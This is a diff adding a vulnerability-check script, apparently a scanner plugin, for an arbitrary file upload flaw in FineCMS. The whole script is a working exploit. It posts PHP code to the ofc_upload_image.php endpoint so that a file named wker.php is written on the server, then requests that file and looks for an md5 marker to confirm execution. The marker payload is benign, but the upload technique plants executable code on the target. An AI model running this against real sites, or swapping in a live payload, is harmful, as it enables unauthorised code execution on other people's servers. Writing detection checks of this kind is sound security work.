@@ -1,0 +1,14 @@
+#request url = var
+#define payload =/dayrui/libraries/Chart/ofc_upload_image.php?name=wker.php
+#define bug = 81dc9bdb52d04dc20036dbd8313ed055
+#define info = 存在FineCMS任意文件上传漏洞
+#define PostData = <?print(md5(1234));?>
+function main(args)
+{
+	HttpPost(url.payload,PostData,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	res = HttpGet(url."/dayrui/libraries/tmp-upload-images/wker.php","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
